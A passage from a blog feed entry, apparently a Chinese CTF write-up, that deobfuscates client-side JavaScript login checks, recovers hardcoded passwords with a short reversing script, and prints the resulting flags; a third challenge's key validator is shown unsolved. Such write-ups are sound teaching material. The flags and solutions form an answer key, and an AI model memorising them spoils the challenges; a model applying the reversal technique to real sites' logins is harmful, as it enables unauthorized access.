_0xf382x2=alk3;if(_0xf382x1==02l1+_0xf382x2)&#123;if(document[location][href][indexOf](?p=)==-1)&#123;document[location]=document[location][href]+?p=+_0xf382x1;&#125; ;&#125; else &#123;$(#cresponse)[html](&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;);&#125; ;&#125; );</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>拖到<a href="http://ddecode.com/" target="_blank" rel="external">http://ddecode.com/</a><br>解一下得到如下代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">// Look's like weak JavaScript auth script :)</span></div><div class="line"><span class="keyword">var</span> _0xc360 = [<span class="string">"val"</span>, <span class="string">"#cpass"</span>, <span class="string">"alk3"</span>, <span class="string">"02l1"</span>, <span class="string">"?p="</span>, <span class="string">"indexOf"</span>, <span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"</span>, <span class="string">"html"</span>, <span class="string">"#cresponse"</span>, <span class="string">"click"</span>, <span class="string">".c_submit"</span>];</div><div class="line"></div><div class="line">$(_0xc360[<span class="number">12</span>])[_0xc360[<span class="number">11</span>]](<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    <span class="keyword">var</span> _0xf382x1 = $(_0xc360[<span class="number">1</span>])[_0xc360[<span class="number">0</span>]]();    <span class="keyword">var</span> _0xf382x2 = _0xc360[<span class="number">2</span>];    <span class="keyword">if</span> (_0xf382x1 == _0xc360[<span class="number">3</span>] + _0xf382x2) &#123;        <span class="keyword">if</span> (<span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]][_0xc360[<span class="number">5</span>]](_0xc360[<span class="number">4</span>]) == <span class="number">-1</span>) &#123;            <span class="built_in">document</span>[_0xc360[<span class="number">7</span>]] = <span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]] + _0xc360[<span class="number">4</span>] + _0xf382x1;        &#125;;    &#125; <span class="keyword">else</span> &#123;        $(_0xc360[<span class="number">10</span>])[_0xc360[<span class="number">9</span>]](_0xc360[<span class="number">8</span>]);    &#125;;&#125;);</div></pre></td></tr></table></figure>
<p>自己再替换一下。总算能看了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> _0xc360 = [<span class="string">"val"</span>, <span class="string">"#cpass"</span>, <span class="string">"alk3"</span>, <span class="string">"02l1"</span>, <span class="string">"?p="</span>, <span class="string">"indexOf"</span>, <span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"</span>, <span class="string">"html"</span>, <span class="string">"#cresponse"</span>, <span class="string">"click"</span>, <span class="string">".c_submit"</span>];</div><div class="line"></div><div class="line">$(<span class="string">".c_submit"</span>)[<span class="string">"click"</span>](<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </div><div class="line">	<span class="keyword">var</span> _0xf382x1 = $(<span class="string">"#cpass"</span>)[<span class="string">"val"</span>]();    </div><div class="line">	<span class="keyword">var</span> _0xf382x2 = <span class="string">"alk3"</span>;    </div><div class="line">	<span class="keyword">if</span> (_0xf382x1 == <span class="string">"02l1"</span> + _0xf382x2) &#123;        </div><div class="line">		<span class="keyword">if</span> (<span class="built_in">document</span>[<span class="string">"location"</span>][<span class="string">"href"</span>][<span class="string">"indexOf"</span>](<span class="string">"?p="</span>,) == <span class="number">-1</span>) &#123;            </div><div class="line">			<span class="built_in">document</span>[<span class="string">"location"</span>] = <span class="built_in">document</span>[<span class="string">"location"</span>][<span class="string">"href"</span>] + <span class="string">"?p="</span>, + _0xf382x1;        </div><div class="line">		&#125;;    </div><div class="line">	&#125; <span class="keyword">else</span> &#123;        </div><div class="line">		$(<span class="string">"#cresponse"</span>)[<span class="string">"html"</span>](<span class="string">"&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"</span>);    </div><div class="line">	&#125;;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>所以密码是 02l1alk3，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-5PJne3T8d73UGv4SCqN44DXj</div></pre></td></tr></table></figure></p>
<h1 id="Why-not"><a href="#Why-not" class="headerlink" title="Why not?"></a>Why not?</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">	event.preventDefault();</div><div class="line">	<span class="keyword">var</span> k = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">176</span>,<span class="number">214</span>,<span class="number">205</span>,<span class="number">246</span>,<span class="number">264</span>,<span class="number">255</span>,<span class="number">227</span>,<span class="number">237</span>,<span class="number">242</span>,<span class="number">244</span>,<span class="number">265</span>,<span class="number">270</span>,<span class="number">283</span>);</div><div class="line">	<span class="keyword">var</span> u = $(<span class="string">"#cuser"</span>).val();</div><div class="line">	<span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</div><div class="line">	<span class="keyword">var</span> t = <span class="literal">true</span>;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(u == <span class="string">"administrator"</span>) &#123;</div><div class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; u.length; i++) &#123;</div><div class="line">			<span class="keyword">if</span>((u.charCodeAt(i) + p.charCodeAt(i) + i * <span class="number">10</span>) != k[i]) &#123;</div><div class="line">				$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">				t = <span class="literal">false</span>;</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">		t = <span class="literal">false</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>(t) &#123;</div><div class="line">		<span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</div><div class="line">			<span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</div><div class="line">			&#125;</div><div class="line">	&#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>写一个js脚本。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	<span class="keyword">var</span> k = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">176</span>,<span class="number">214</span>,<span class="number">205</span>,<span class="number">246</span>,<span class="number">264</span>,<span class="number">255</span>,<span class="number">227</span>,<span class="number">237</span>,<span class="number">242</span>,<span class="number">244</span>,<span class="number">265</span>,<span class="number">270</span>,<span class="number">283</span>);</div><div class="line">	<span class="keyword">var</span> u = <span class="string">"administrator"</span>;</div><div class="line">	<span class="keyword">var</span> p = <span class="string">""</span>;</div><div class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; u.length; i++)&#123;</div><div class="line">		p += <span class="built_in">String</span>.fromCharCode(k[i] - i * <span class="number">10</span> - u.charCodeAt(i) );</div><div class="line">	&#125;</div><div class="line">	alert(p);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
<p>弹框得到结果：OhLord4309111，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-65t23674o6N2NehA44272G24</div></pre></td></tr></table></figure></p>
<h1 id="Valid-key-required"><a href="#Valid-key-required" class="headerlink" title="Valid key required"></a>Valid key required</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">curry</span>(<span class="params"> orig_func </span>) </span>&#123;</div><div class="line">			<span class="keyword">var</span> ap = <span class="built_in">Array</span>.prototype, args = <span class="built_in">arguments</span>;</div><div class="line"></div><div class="line">			<span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</div><div class="line">			ap.push.apply( fn.args, <span class="built_in">arguments</span> );</div><div class="line">			<span class="keyword">return</span> fn.args.length &lt; orig_func.length ? fn : orig_func.apply( <span class="keyword">this</span>, fn.args );</div><div class="line">			&#125;</div><div class="line"></div><div class="line">			<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">			fn.args = ap.slice.call( args, <span class="number">1</span> );</div><div class="line">			<span class="keyword">return</span> fn.apply( <span class="keyword">this</span>, <span class="built_in">arguments</span> );</div><div class="line">			&#125;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">x,y,i,a</span>) </span>&#123;</div><div class="line">		  <span class="keyword">return</span> !y.call(x, a[a[<span class="string">"length"</span>]<span class="number">-1</span>-i].toString().slice(<span class="number">19</span>,<span class="number">21</span>)) ? x : &#123;&#125;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">var</span> ref = &#123;<span class="attr">T</span> : <span class="string">"BG8"</span>,<span class="attr">J</span> : <span class="string">"jep"</span>,<span class="attr">j</span> : <span class="string">"M2L"</span>,<span class="attr">K</span> : <span class="string">"L23"</span>,<span class="attr">H</span> : <span class="string">"r1A"</span>&#125;;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">validatekey</span>(<span class="params"></span>)</span></div><div class="line">		&#123;</div><div class="line">			e = <span class="literal">false</span>;</div><div class="line">			<span class="keyword">var</span> _strKey = <span class="string">""</span>;</div><div class="line">		    <span class="keyword">try</span> &#123;</div><div class="line">				_strKey = <span class="built_in">document</span>.getElementById(<span class="string">"key"</span>).value;</div><div class="line">		        <span class="keyword">var</span> a = _strKey.split(<span class="string">"-"</span>);</div><div class="line">		        <span class="keyword">if</span>(a.length !== <span class="number">5</span>)</div><div class="line">		        	e = <span class="literal">true</span>;</div><div class="line"></div><div class="line">		        <span class="keyword">var</span> o=a.map(genFunc).reduceRight(callback, <span class="keyword">new</span> (genFunc(a[<span class="number">4</span>]))(<span class="built_in">Function</span>));</div><div class="line"></div><div class="line">		        <span class="keyword">if</span>(!equal(o,ref))</div><div class="line">					e = <span class="literal">true</span>;</div><div class="line"></div><div class="line">		    &#125;<span class="keyword">catch</span>(e)&#123;</div><div class="line">		    	e = <span class="literal">true</span>;</div><div class="line">		    &#125;</div><div class="line"></div><div class="line">		    <span class="keyword">if</span>(!e) &#123;</div><div class="line">		    	<span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</div><div class="line">					<span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + _strKey;</div><div class="line">           		&#125;</div><div class="line">		    &#125; <span class="keyword">else</span> &#123;</div><div class="line">		    	$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">			&#125;   </div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">equal</span>(<span class="params">o,o1</span>)</span></div><div class="line">		&#123;</div><div class="line">		    <span class="keyword">var</span> keys1 = <span class="built_in">Object</span>.keys(o1);</div><div class="line">		    <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys(o);</div><div class="line">		    <span class="keyword">if</span>(keys1.length != keys.length)</div><div class="line">		        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">		    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;keys.length;i++)</div><div class="line">		         <span class="keyword">if</span>(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]])</div><div class="line">		            <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">		    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line"></div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">hook</span>(<span class="params">f1,f2,f3</span>) </span>&#123;</div><div class="line">		    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> f2(f1(x),f3(x));&#125;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">var</span> h = curry(hook);</div><div class="line">		<span class="keyword">var</span> fn = h(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;<span class="keyword">return</span> x &gt;= <span class="number">48</span>;&#125;,<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"return a &amp;&amp; b;"</span>));</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">genFunc</span>(<span class="params">_part</span>) </span>&#123;</div><div class="line">		    <span class="keyword">if</span>(!_part || !(_part.length) || _part.length !== <span class="number">4</span>)</div><div class="line">		        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</div><div class="line"></div><div class="line">		    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(_part.substring(<span class="number">1</span>,<span class="number">3</span>), <span class="string">"this."</span> + _part[<span class="number">3</span>] + <span class="string">"="</span> + _part.slice(<span class="number">1</span>,<span class="number">3</span>) + <span class="string">"+"</span> + (fn(<span class="function"><span class="keyword">function</span>(<span class="params">y</span>)</span>&#123;<span class="keyword">return</span> y&lt;=<span class="number">57</span>&#125;)(_part.charCodeAt(<span class="number">0</span>)) ?  _part[<span class="number">0</span>] : <span class="string">"'"</span>+ _part[<span class="number">0</span>] + <span class="string">"'"</span>));</div><div class="line">		&#125;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;未完待续..待续..&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="javascript" scheme="http://yoursite.com/tags/javascript/"/>
    
  </entry>
  
</feed>
